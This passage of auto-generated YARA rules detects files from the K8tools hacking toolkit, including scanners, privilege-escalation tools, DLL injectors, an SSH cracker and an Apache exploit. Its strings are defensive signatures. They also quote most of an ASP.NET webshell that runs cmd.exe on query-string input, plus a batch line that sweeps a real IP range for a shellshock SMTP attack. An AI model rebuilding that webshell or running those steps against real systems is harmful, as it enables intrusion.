      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "f0922943cd5e72743dc95ef474069cfd" or 8 of them )
}

rule K8Cscan5_4_20191025 {
   meta:
      description = "K8tools - file K8Cscan5.4_20191025.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0cc9f7533182156c1e76b3bd7ddbd1123724b89ac230f7dafb173cf26f39ccad"
   strings:
      $s1 = "Cscan(.net_4x).exe" fullword ascii /* score: '20.00'*/
      $s2 = "Cscan(.net_2x_3x).exe" fullword ascii /* score: '20.00'*/
      $s3 = "ReadMe.txt" fullword ascii /* score: '17.00'*/
      $s4 = "K8Cscan.gif" fullword ascii /* score: '11.00'*/
      $s5 = "CobaltStrike.gif" fullword ascii /* score: '10.00'*/
      $s6 = "SAMPl>4" fullword ascii /* score: '8.00'*/
      $s7 = "a?k:\"r" fullword ascii /* score: '7.00'*/
      $s8 = ">&@f:\\:" fullword ascii /* score: '7.00'*/
      $s9 = "=u/k@iW- " fullword ascii /* score: '5.42'*/
      $s10 = "77m+ <]" fullword ascii /* score: '5.00'*/
      $s11 = "JaBEy58" fullword ascii /* score: '5.00'*/
      $s12 = ",r -Ki" fullword ascii /* score: '5.00'*/
      $s13 = "%Ge%l4" fullword ascii /* score: '5.00'*/
      $s14 = "\\nYia\"HT" fullword ascii /* score: '5.00'*/
      $s15 = "%x%<sUuci" fullword ascii /* score: '5.00'*/
      $s16 = "\\.qLI}j_X" fullword ascii /* score: '5.00'*/
      $s17 = "AUsgDp " fullword ascii /* score: '4.42'*/
      $s18 = "qnIdI c" fullword ascii /* score: '4.00'*/
      $s19 = "XrTt`{0 (" fullword ascii /* score: '4.00'*/
      $s20 = "M nldz?" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule K8tools_k8cmd_2 {
   meta:
      description = "K8tools - file k8cmd.ascx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "92e9e987a994b27cfaa6b7d05e7a51534ff96bbc73616fdefe2eaf85461dc1f6"
   strings:
      $s1 = "psi.FileName = \"cmd.exe\";" fullword ascii /* score: '28.00'*/
      $s2 = "psi.UseShellExecute = false;" fullword ascii /* score: '21.17'*/
      $s3 = "<asp:Button ID=\"Button1\" runat=\"server\" onclick=\"cmdExe_Click\" Text=\"Execute\" /><br /><br />" fullword ascii /* score: '21.00'*/
      $s4 = "<HTML><body ><form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii /* score: '17.00'*/
      $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii /* score: '15.00'*/
      $s6 = "Process p = Process.Start(psi);" fullword ascii /* score: '15.00'*/
      $s7 = "cmdResult.Text = cmdResult.Text + Server.HtmlEncode(ExcuteCmd(txt_cmd.Text));" fullword ascii /* score: '14.00'*/
      $s8 = "Response.Write(ExcuteCmd(Request.QueryString[\"cmd\"].ToString()));" fullword ascii /* score: '12.00'*/
      $s9 = "psi.Arguments = \"/c \" + arg;" fullword ascii /* score: '11.00'*/
      $s10 = "void cmdExe_Click(object sender, System.EventArgs e)" fullword ascii /* score: '10.00'*/
      $s11 = "<script runat=\"server\">" fullword ascii /* score: '10.00'*/
      $s12 = "<asp:Label ID=\"Label2\" runat=\"server\" Text=\"Commond: \"></asp:Label>" fullword ascii /* score: '10.00'*/
      $s13 = "<asp:TextBox ID=\"cmdResult\" runat=\"server\" Height=\"662px\" Width=\"798px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii /* score: '10.00'*/
      $s14 = "<asp:TextBox ID=\"txt_cmd\" runat=\"server\" Width=\"581px\"></asp:TextBox>&nbsp;" fullword ascii /* score: '10.00'*/
      $s15 = "//Request.QueryString[\"cmd\"].ToString();" fullword ascii /* score: '9.00'*/
      $s16 = "//Response.Write(Request.QueryString[\"cmd\"].ToString());" fullword ascii /* score: '9.00'*/
      $s17 = "psi.RedirectStandardOutput = true;" fullword ascii /* score: '7.17'*/
      $s18 = "string ExcuteCmd(string arg)" fullword ascii /* score: '7.00'*/
      $s19 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii /* score: '7.00'*/
      $s20 = "string s = stmrdr.ReadToEnd();" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 4KB and
      8 of them
}

rule Ladon5_5 {
   meta:
      description = "K8tools - file Ladon5.5.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ede256b254b32e44ceaaad50a09c3820647791f45707577862654d691474cf1a"
   strings:
      $s1 = "Ladon.exe" fullword ascii /* score: '22.00'*/
      $s2 = "Ladon40.exe" fullword ascii /* score: '22.00'*/
      $s3 = "ReadMe.txt" fullword ascii /* score: '17.00'*/
      $s4 = "Ladon.gif" fullword ascii /* score: '10.00'*/
      $s5 = "Ladon.cna" fullword ascii /* score: '10.00'*/
      $s6 = "atuvwxyz" fullword ascii /* score: '8.00'*/
      $s7 = "CS_Ladon.gif" fullword ascii /* score: '7.00'*/
      $s8 = "- X]m!@" fullword ascii /* score: '5.00'*/
      $s9 = "\",F# -" fullword ascii /* score: '5.00'*/
      $s10 = "# s4e[`" fullword ascii /* score: '5.00'*/
      $s11 = "SJXWHFTJ957" fullword ascii /* score: '5.00'*/
      $s12 = "%D%gu`" fullword ascii /* score: '5.00'*/
      $s13 = "7%Xi%vy" fullword ascii /* score: '5.00'*/
      $s14 = "%Y%$vY" fullword ascii /* score: '5.00'*/
      $s15 = "hyQXiw1" fullword ascii /* score: '5.00'*/
      $s16 = "z=19/LoMK.qL " fullword ascii /* score: '4.42'*/
      $s17 = "^QiLmYV%\\]" fullword ascii /* score: '4.42'*/
      $s18 = ",AdPk[3j\\;" fullword ascii /* score: '4.42'*/
      $s19 = "_BVQYTp " fullword ascii /* score: '4.42'*/
      $s20 = "imWiu c" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      8 of them
}

rule Lpk_______K8 {
   meta:
      description = "K8tools - file Lpk提权_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "63c82a60db232c03ba5cc6f0392c159cf3bfa456afb28eca994a95b298ee50b4"
   strings:
      $s1 = "\\lpk1\\lpk.dll" fullword ascii /* score: '18.42'*/
      $s2 = "\\lpk2\\lpk.dll" fullword ascii /* score: '18.42'*/
      $s3 = "h&h:\"h" fullword ascii /* score: '7.00'*/
      $s4 = "AEFC.eS" fullword ascii /* score: '4.00'*/
      $s5 = "Nsbv\"FT(" fullword ascii /* score: '4.00'*/
      $s6 = "Wlsu\\(l" fullword ascii /* score: '4.00'*/
      $s7 = "Zhqz\\^" fullword ascii /* score: '4.00'*/
      $s8 = "HEcJJtj" fullword ascii /* score: '4.00'*/
      $s9 = "tnIIg/;J<" fullword ascii /* score: '4.00'*/
      $s10 = "KhAN]#7" fullword ascii /* score: '4.00'*/
      $s11 = "\\qEt9*J" fullword ascii /* score: '2.00'*/
      $s12 = "_Np~J " fullword ascii /* score: '1.42'*/
      $s13 = "LpV#8 " fullword ascii /* score: '1.42'*/
      $s14 = "w:*0t^ " fullword ascii /* score: '1.42'*/
      $s15 = "P *<R9" fullword ascii /* score: '1.00'*/
      $s16 = ":-=+$ (" fullword ascii /* score: '1.00'*/
      $s17 = "v3 <\"D" fullword ascii /* score: '1.00'*/
      $s18 = "dpFW N" fullword ascii /* score: '1.00'*/
      $s19 = "c|]2of 6" fullword ascii /* score: '1.00'*/
      $s20 = "R<=F):E" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 300KB and
      8 of them
}

rule GetPwd_K8 {
   meta:
      description = "K8tools - file GetPwd_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b4e33ca07659837b687587343a5f91d1f26a04c4b30cacba25e56d4eedb0c736"
   strings:
      $s1 = "GetPwd_K8\\GetPwd_Release_VC6.exe" fullword ascii /* score: '20.42'*/
      $s2 = "GetPwd_K8\\GetPwd_Relase_VS2010.exe" fullword ascii /* score: '20.42'*/
      $s3 = "GetPwd_K8\\GetPwd_Debug_VC6.exe" fullword ascii /* score: '20.00'*/
      $s4 = "GetPwd_K8\\GetPwd_Debug_VS2010.exe" fullword ascii /* score: '20.00'*/
      $s5 = "GetPwd_K8\\ReaeMe_K8.txt" fullword ascii /* score: '16.00'*/
      $s6 = "GetPwd_K8" fullword ascii /* score: '9.00'*/
      $s7 = "vevivj" fullword ascii /* score: '5.00'*/
      $s8 = "H- QG{" fullword ascii /* score: '5.00'*/
      $s9 = "TuDEUL&" fullword ascii /* score: '4.00'*/
      $s10 = "TtFF!QF" fullword ascii /* score: '4.00'*/
      $s11 = "UXDVR()" fullword ascii /* score: '4.00'*/
      $s12 = "NbAD>7#" fullword ascii /* score: '4.00'*/
      $s13 = "F)EmMaUZ{{G" fullword ascii /* score: '4.00'*/
      $s14 = "hOVULR{" fullword ascii /* score: '4.00'*/
      $s15 = "N*NVNjO1'" fullword ascii /* score: '4.00'*/
      $s16 = "^0riGE0Kr" fullword ascii /* score: '4.00'*/
      $s17 = "qi]AFKq<.V" fullword ascii /* score: '4.00'*/
      $s18 = "HVLh*)tLJ#AX" fullword ascii /* score: '4.00'*/
      $s19 = "oZgU1!`" fullword ascii /* score: '4.00'*/
      $s20 = "HPdK!%" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 600KB and
      8 of them
}

rule ______Admin2SystemRun_0419_K8_ {
   meta:
      description = "K8tools - file 提权Admin2SystemRun_0419[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "69d1441d7c47388922f5a74b25e28cdc4c929f7a5ba1b33b414aa2a6ca64ce4b"
   strings:
      $s1 = "Admin2SystemRun.exe" fullword ascii /* score: '25.00'*/
      $s2 = "yVEDLK$" fullword ascii /* score: '4.00'*/
      $s3 = "91.UQD" fullword ascii /* score: '4.00'*/
      $s4 = "\\9U8}r" fullword ascii /* score: '2.00'*/
      $s5 = "0uq3e5-\\Na*" fullword ascii /* score: '1.17'*/
      $s6 = "[@pA~ A" fullword ascii /* score: '1.00'*/
      $s7 = "PN)>rq" fullword ascii /* score: '1.00'*/
      $s8 = "&6jR^4" fullword ascii /* score: '1.00'*/
      $s9 = "@5&]Y>" fullword ascii /* score: '1.00'*/
      $s10 = "Xn\"[wS" fullword ascii /* score: '1.00'*/
      $s11 = ">b%@8~#" fullword ascii /* score: '1.00'*/
      $s12 = "!wG\"\\H" fullword ascii /* score: '1.00'*/
      $s13 = "=Wl%@dQ" fullword ascii /* score: '1.00'*/
      $s14 = "F\\xELR" fullword ascii /* score: '1.00'*/
      $s15 = "3]BS$0" fullword ascii /* score: '1.00'*/
      $s16 = "ya}Ex." fullword ascii /* score: '1.00'*/
      $s17 = "&B(!nD" fullword ascii /* score: '1.00'*/
      $s18 = "n:[?s-u" fullword ascii /* score: '1.00'*/
      $s19 = ")g:G>:}" fullword ascii /* score: '1.00'*/
      $s20 = "3%L7n|" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      8 of them
}

rule Apache_2_2_1_4_mod_isapi_exploit {
   meta:
      description = "K8tools - file Apache 2.2.1.4 mod_isapi exploit.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b91babbc8cc32809a7e79748a378d76c8643c1bd59c841a82c1f1c23fbcfd9a2"
   strings:
      $x1 = "Apache 2.2.1.4 isapi\\cmd.exe" fullword ascii /* score: '34.00'*/
      $s2 = "Apache 2.2.1.4 isapi\\SMTPSend.dll %" fullword ascii /* score: '26.00'*/
      $s3 = "Apache 2.2.1.4 isapi\\CVE20100425.exe" fullword ascii /* score: '24.00'*/
      $s4 = "+UrCVE20100425.exe IP \"SMTPSend.dll?send\"" fullword ascii /* score: '21.00'*/
      $s5 = "Apache 2.2.1.4 isapi\\User.txt" fullword ascii /* score: '19.00'*/
      $s6 = "Apache 2.2.1.4 isapi" fullword ascii /* score: '9.00'*/
      $s7 = "RtMPCHN" fullword ascii /* score: '7.00'*/
      $s8 = "*tE`\" /Q" fullword ascii /* score: '5.00'*/
      $s9 = "dk91!." fullword ascii /* score: '5.00'*/
      $s10 = "5cmD[9" fullword ascii /* score: '4.00'*/
      $s11 = "y-U$5.LHO" fullword ascii /* score: '4.00'*/
      $s12 = "SLZq\\U" fullword ascii /* score: '4.00'*/
      $s13 = "-1bWuU7:zg>5I" fullword ascii /* score: '4.00'*/
      $s14 = "TspdqB:" fullword ascii /* score: '4.00'*/
      $s15 = "mfUp|'2" fullword ascii /* score: '4.00'*/
      $s16 = "EWDFL+C" fullword ascii /* score: '4.00'*/
      $s17 = "MUWE>\\&" fullword ascii /* score: '4.00'*/
      $s18 = "eKoC*C8O4" fullword ascii /* score: '4.00'*/
      $s19 = "xJ^.uhO" fullword ascii /* score: '4.00'*/
      $s20 = "OSFdD7U" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule K8______SMTP_Bat___ {
   meta:
      description = "K8tools - file K8破壳SMTP Bat版.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "bf625a752238c0ce369c0f8aece2acac5bd534b02eaa1aae1dbb6bdd3f38673d"
   strings:
      $s1 = "smtp.bat" fullword ascii /* score: '23.00'*/
      $s2 = "for /l %%i in (1,1,255) do echo 174.47.106.%%i>>ip.txt" fullword ascii /* score: '22.00'*/
      $s3 = "\\sleep.exe" fullword ascii /* score: '16.00'*/
      $s4 = "\\shellshock_smtp.py" fullword ascii /* score: '15.00'*/
      $s5 = "SMTP Bat" fullword ascii /* score: '9.00'*/
      $s6 = "\\ip.txt" fullword ascii /* score: '9.00'*/
      $s7 = "%del ip.txt" fullword ascii /* score: '8.00'*/
      $s8 = "BatHr)\\yb" fullword ascii /* score: '4.00'*/
      $s9 = "KaoS8l_" fullword ascii /* score: '4.00'*/
      $s10 = "BatHr*\\" fullword ascii /* score: '4.00'*/
      $s11 = "U)K[@/23!" fullword ascii /* score: '1.00'*/
      $s12 = "B5cmv<B" fullword ascii /* score: '1.00'*/
      $s13 = "JmvnRf" fullword ascii /* score: '1.00'*/
      $s14 = "_IL%r<" fullword ascii /* score: '1.00'*/
      $s15 = "BatHr(\\u" fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 10KB and
      8 of them
}

rule K8tools__git_refs_remotes_origin_HEAD {
   meta:
      description = "K8tools - file HEAD"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "cdc65e67690c4c6475174e5ec662b70655246a2f3924354778835ab3be70aa76"
   strings:
      $s1 = "ref: refs/remotes/origin/master" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x6572 and filesize < 1KB and
      all of them
}

rule LadonExp {
   meta:
      description = "K8tools - file LadonExp.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1acb70177cad67f55bcfd0cf06a7790a25891ff1ebc4d5600dade88c71fb76e8"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "LadonExp.exe" fullword wide /* score: '22.00'*/
      $s3 = "Type type = assembly.GetType(\"CscanDLL.scan\");" fullword ascii /* score: '15.00'*/
      $s4 = "using System.IO.Compression;" fullword ascii /* score: '14.00'*/
      $s5 = "string str0 = \"$HttpXforwardedFor$\";" fullword ascii /* score: '12.00'*/
      $s6 = "string str1 = \"$UserAgent$\";" fullword ascii /* score: '12.00'*/
      $s7 = "object value = type.GetMethod(\"HttpPocTest\", params_type).Invoke(instance, params_obj);" fullword ascii /* score: '12.00'*/
      $s8 = "object instance = assembly.CreateInstance(\"CscanDLL.scan\");" fullword ascii /* score: '10.00'*/
      $s9 = "public class scan" fullword ascii /* score: '10.00'*/
      $s10 = "public static byte[] Decompress(byte[] bytes)" fullword ascii /* score: '10.00'*/
      $s11 = "txt_cscandll.Text" fullword wide /* score: '10.00'*/
      $s12 = "public static string run(string ip)" fullword ascii /* score: '10.00'*/
      $s13 = "private static byte[] httpreq()" fullword ascii /* score: '10.00'*/
      $s14 = "string str3 = \"$PostData$\";" fullword ascii /* score: '9.00'*/
      $s15 = "string str17 = \"$XforwardedFor$\";" fullword ascii /* score: '9.00'*/
      $s16 = "string str2 = \"$ContentType$\";" fullword ascii /* score: '9.00'*/
      $s17 = "using (GZipStream zipStream = new GZipStream(compressStream, CompressionMode.Decompress))" fullword ascii /* score: '9.00'*/
      $s18 = "namespace LadonDLL" fullword ascii /* score: '9.00'*/
      $s19 = "Result = str1 + \"\\t\" + regResult;" fullword ascii /* score: '8.00'*/
      $s20 = "Result = str1 + \"\\t\" + str19;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule DLL_____________________UAC_0227_K8_ {
   meta:
      description = "K8tools - file DLL注入进程工具过UAC_0227[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "9e749df5e9ede455a5c7b3ba305f9b6f5bd66ad7d155ad95c153f28222bd7520"
   strings:
      $x1 = "\\DllInjectProcess_cn.exe" fullword ascii /* score: '42.00'*/
      $x2 = "\\DllInjectProcess_en.exe" fullword ascii /* score: '42.00'*/
      $s3 = "eBz.rTH" fullword ascii /* score: '7.00'*/
      $s4 = "7eYE0OQOv" fullword ascii /* score: '6.00'*/
      $s5 = "1WW)v- ?]8a" fullword ascii /* score: '5.42'*/
      $s6 = "6NM* 8" fullword ascii /* score: '5.00'*/
      $s7 = ";- OGt" fullword ascii /* score: '5.00'*/
      $s8 = "+/?BJoM J=@" fullword ascii /* score: '4.00'*/
      $s9 = "trGS6YpB" fullword ascii /* score: '4.00'*/
      $s10 = "ERTL4\\" fullword ascii /* score: '4.00'*/
      $s11 = "]khRxy.{" fullword ascii /* score: '4.00'*/
      $s12 = "=QSva8$p~" fullword ascii /* score: '4.00'*/
      $s13 = "W[x.rLk:(" fullword ascii /* score: '4.00'*/
      $s14 = "UkCVs=g" fullword ascii /* score: '4.00'*/
      $s15 = "FsiFzz3*@" fullword ascii /* score: '4.00'*/
      $s16 = "TtbW5O&" fullword ascii /* score: '4.00'*/
      $s17 = "wuJNU3j" fullword ascii /* score: '4.00'*/
      $s18 = "DrcI'@C$" fullword ascii /* score: '4.00'*/
      $s19 = ">EAEuGp*" fullword ascii /* score: '4.00'*/
      $s20 = "WWMQe>E" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule K8_SQL__________________V1_0_20190301_K8_ {
   meta:
      description = "K8tools - file K8 SQL强化练习工具V1.0_20190301[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "280ba3434d6f62eb127d9e43b04c930a16d7aee115dc8594712e4226e0053247"
   strings:
      $s1 = "V1.0\\K8skin.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "V1.0\\msstdfmt.dll" fullword ascii /* score: '20.00'*/
      $s3 = "V1.0\\k8study.mdb" fullword ascii /* score: '7.00'*/
      $s4 = "V1.0\\MSDATGRD.OCX" fullword ascii /* score: '7.00'*/
      $s5 = "NlV* w" fullword ascii /* score: '5.00'*/
      $s6 = "%~8hWbN\";f" fullword ascii /* score: '4.42'*/
      $s7 = "V1.0\\k8qqkiss.skin" fullword ascii /* score: '4.00'*/
      $s8 = "ewVb4d`" fullword ascii /* score: '4.00'*/
      $s9 = "LBgd6\"" fullword ascii /* score: '4.00'*/
      $s10 = "rMhB!U" fullword ascii /* score: '4.00'*/
      $s11 = "=YsnU1P," fullword ascii /* score: '4.00'*/
      $s12 = "nKbV`-N" fullword ascii /* score: '4.00'*/
      $s13 = "JpIjkI&" fullword ascii /* score: '4.00'*/
      $s14 = "AJEXbaB" fullword ascii /* score: '4.00'*/
      $s15 = "MBha1[h=" fullword ascii /* score: '4.00'*/
      $s16 = "Mb.MRQ" fullword ascii /* score: '4.00'*/
      $s17 = "YIzqsz&" fullword ascii /* score: '4.00'*/
      $s18 = "=.IrJ&" fullword ascii /* score: '4.00'*/
      $s19 = "CLXI=m[*" fullword ascii /* score: '4.00'*/
      $s20 = ">hqqji?" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule K8PortScan_Kali_x86 {
   meta:
      description = "K8tools - file K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* score: '17.00'*/
      $s2 = "Cannot dlsym for PyImport_ExecCodeModule" fullword ascii /* score: '15.00'*/
      $s3 = "pyi-bootloader-ignore-signals" fullword ascii /* score: '13.00'*/
      $s4 = "Error loading Python lib '%s': dlopen: %s" fullword ascii /* score: '10.00'*/
      $s5 = "/6 6(6$6,6\"6*6&6." fullword ascii /* score: '9.00'*/ /* hex encoded string 'ffff' */
      $s6 = "7/6/5/1/3/7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'vQ7' */
      $s7 = "':6:&:):3" fullword ascii /* score: '9.00'*/ /* hex encoded string 'c' */
      $s8 = "* RUsO" fullword ascii /* score: '9.00'*/
      $s9 = "Ue- _DZBZF*A7e" fullword ascii /* score: '8.17'*/
      $s10 = "+ RQZgA]qFg!R" fullword ascii /* score: '8.00'*/
      $s11 = "Cannot dlsym for Py_NoUserSiteDirectory" fullword ascii /* score: '8.00'*/
      $s12 = "wmpmtmrmvmq" fullword ascii /* score: '8.00'*/
      $s13 = "wopotorovoq" fullword ascii /* score: '8.00'*/
      $s14 = "uupuruquw" fullword ascii /* score: '8.00'*/
      $s15 = "kfhfjfifk" fullword ascii /* score: '8.00'*/
      $s16 = "sK8PortScan" fullword ascii /* score: '8.00'*/
      $s17 = "ltlrlvlqlulslw" fullword ascii /* score: '8.00'*/
      $s18 = ".note.gnu.build-id" fullword ascii /* score: '7.07'*/
      $s19 = "b_hashlib.i386-linux-gnu.so" fullword ascii /* score: '7.00'*/
      $s20 = "_IO_stdin_used" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 12000KB and
      8 of them
}

rule K8____________WebShell____________ {
   meta:
      description = "K8tools - file K8驱动防止WebShell提权工具.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2870a741d34fb86a921e653184c7b6ac12b22d01f52c7cdcf78913b0f0f47c4c"
   strings:
      $s1 = "\\K8ShellNoExecExe.sys" fullword ascii /* score: '30.00'*/
      $s2 = "WebShell" fullword ascii /* score: '9.00'*/
      $s3 = "0d<<-E" fullword ascii /* score: '1.00'*/
      $s4 = "Ji3ZGRJd" fullword ascii /* score: '1.00'*/
      $s5 = "Shel*l" fullword ascii /* score: '1.00'*/
      $s6 = "&<*LnW" fullword ascii /* score: '1.00'*/
      $s7 = "ikrcg," fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 8KB and
      all of them
}

rule sshcrack_2 {
   meta:
      description = "K8tools - file sshcrack.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "btcl85.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s5 = "btk85.dll" fullword ascii /* score: '20.00'*/
      $s6 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s8 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s9 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s10 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s11 = "b_win32sysloader.pyd" fullword ascii /* score: '16.00'*/
      $s12 = "future.backports.http.cookiejar(" fullword ascii /* score: '16.00'*/
      $s13 = "future.backports.email._encoded_words(" fullword ascii /* score: '15.42'*/
      $s14 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s15 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_BuildValue" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PySys_SetArgvEx" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PyUnicode_FromFormat" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PySys_GetObject" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 28000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule DB_Owner_GetShell_K8 {
   meta:
      description = "K8tools - file DB_Owner_GetShell_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "56d21710a14d89cd77493724c4ef92d95eadf67376dcfacb3081b4cbc278b8b1"
   strings:
      $s1 = "[K.8].exe" fullword ascii /* score: '16.00'*/
      $s2 = "YfuO,|7t\\i" fullword ascii /* score: '4.00'*/
      $s3 = "txFXs2" fullword ascii /* score: '2.00'*/
      $s4 = ".0fv7q" fullword ascii /* score: '1.00'*/
      $s5 = "f1G;ct" fullword ascii /* score: '1.00'*/
      $s6 = "r93W~Ld" fullword ascii /* score: '1.00'*/
      $s7 = ".-+/QEl" fullword ascii /* score: '1.00'*/
      $s8 = "BbdbH(" fullword ascii /* score: '1.00'*/
      $s9 = "q<):_WhZ" fullword ascii /* score: '1.00'*/
      $s10 = "Shel(l" fullword ascii /* score: '1.00'*/
      $s11 = "]e]W9uWY_" fullword ascii /* score: '1.00'*/
      $s12 = "9@#KY." fullword ascii /* score: '1.00'*/
      $s13 = "M]5E[&" fullword ascii /* score: '1.00'*/
      $s14 = ">4U6$>b" fullword ascii /* score: '1.00'*/
      $s15 = "DB_Owner" fullword ascii /* score: '1.00'*/
      $s16 = "59'<B;" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8___________________________V3_0 {
   meta:
      description = "K8tools - file K8木马病毒后门监视器V3.0.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c093a6a05366fa33d008974f4200547e8ad7437b3add02adcac636b317e3bcdb"
   strings:
      $s1 = "V3.0\\SkinHu.dll" fullword ascii /* score: '20.00'*/
      $s2 = "V3.0\\skinh.she" fullword ascii /* score: '7.00'*/
      $s3 = "M:\\uzsf" fullword ascii /* score: '7.00'*/
      $s4 = "RMClu\"^7\\;" fullword ascii /* score: '4.17'*/
      $s5 = "iYnjM(6" fullword ascii /* score: '4.00'*/
      $s6 = "lTGfxQ\"0k" fullword ascii /* score: '4.00'*/
      $s7 = "fICU}FE" fullword ascii /* score: '4.00'*/
      $s8 = "WYww3De#G" fullword ascii /* score: '4.00'*/
      $s9 = "MhdD=u&" fullword ascii /* score: '4.00'*/
      $s10 = "rtMwf6\\" fullword ascii /* score: '4.00'*/
      $s11 = "atAq.Yz" fullword ascii /* score: '4.00'*/
      $s12 = "PAIIj`\"" fullword ascii /* score: '4.00'*/
      $s13 = "{x.bwC" fullword ascii /* score: '4.00'*/
      $s14 = "xCkU\"^" fullword ascii /* score: '4.00'*/
      $s15 = "WenFmPaM" fullword ascii /* score: '4.00'*/
      $s16 = "zInI\"?6" fullword ascii /* score: '4.00'*/
      $s17 = "hYFYoBt" fullword ascii /* score: '4.00'*/
      $s18 = "\\X\\]c?" fullword ascii /* score: '2.00'*/
      $s19 = "cmAAZ3" fullword ascii /* score: '2.00'*/
      $s20 = "VxbEm0" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 600KB and
      8 of them
}

rule k8bbs_php_mysql___________________ {
   meta:
      description = "K8tools - file k8bbs(php+mysql)注入漏洞环境.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "f8e3b98dfcc11bdbf8616147eb95cbcfb65344c82c0e56d93845e9fa97110bd7"
   strings:
      $s1 = "\\k8db.txt" fullword ascii /* score: '9.00'*/
      $s2 = "\\conn.php" fullword ascii /* score: '8.00'*/
